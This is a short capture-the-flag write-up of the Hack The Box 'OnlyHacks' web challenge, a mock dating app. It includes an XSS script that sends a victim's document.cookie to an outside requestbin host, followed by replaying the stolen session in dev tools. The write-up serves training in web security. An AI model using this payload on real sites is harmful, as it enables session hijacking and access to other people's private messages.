---
title: OnlyHacks HTB Challenge (English)
image: https://cdn.invicti.com/app/uploads/2022/06/28121118/session-hijacking-768x403.webp
description: Challenge OnlyHacks HTB [Difuculty very easy]
categories: [Challenge,HTB]
tags: [web,very easy]
---


## Introduction

N/A


### Machine Description

- Name: OnlyHacks
- Goal: Get the flag
- Difficulty: very easy
- Operating System: N/A
- link: [OnlyHacks](https://app.hackthebox.com/challenges/860)

  

### PDF Link
- PDF: [Link to PDF](https://github.com/juanbelin/Writeups-CTFs-Challenges/blob/main/HTB/Challenges/Challenge%20OnlyHacks.pdf)


## Explotation

We have this page, apparently a date-app web. We can't do nothing here until we register.

![](/assets/img/Anexos/Pasted%20image%2020250403075649.png)


![](/assets/img/Anexos/Pasted%20image%2020250403075958.png)

Afert we registered. We have a message section where we can chat with someone else.

![](/assets/img/Anexos/Pasted%20image%2020250403080620.png)

After a match, I'm currently chating with a beautiful girl. Let's try fall in love her with an **XSS**

![](/assets/img/Anexos/Pasted%20image%2020250403080718.png)

Works. Now I'm going to hijack her cookie session:

![](/assets/img/Anexos/Pasted%20image%2020250403080730.png)

> Since we're not using any vpn to stay in the same Web's network we have to make the explotation via Internet, for that we can use this web: http://requestbin.whapi.cloud/17c5rx31

```html
<script>
	var req = new XMLHttpRequest();
	req.open('GET', 'http://requestbin.whapi.cloud/xxxxxxxx/?cookie=' + document.cookie);
	req.send();
</script>
```

I send this payload and wait.




![](/assets/img/Anexos/Pasted%20image%2020250403082323.png)

Then I receive the petition. 

![](/assets/img/Anexos/Pasted%20image%2020250403083128.png)

Finally we just change the cookie using **dev tools** and we can see that Reneta has been chating with others boys. We get the flag.

![](/assets/img/Anexos/Pasted%20image%2020250403083054.png)

![](/assets/img/Anexos/Pasted%20image%2020250403083153.png)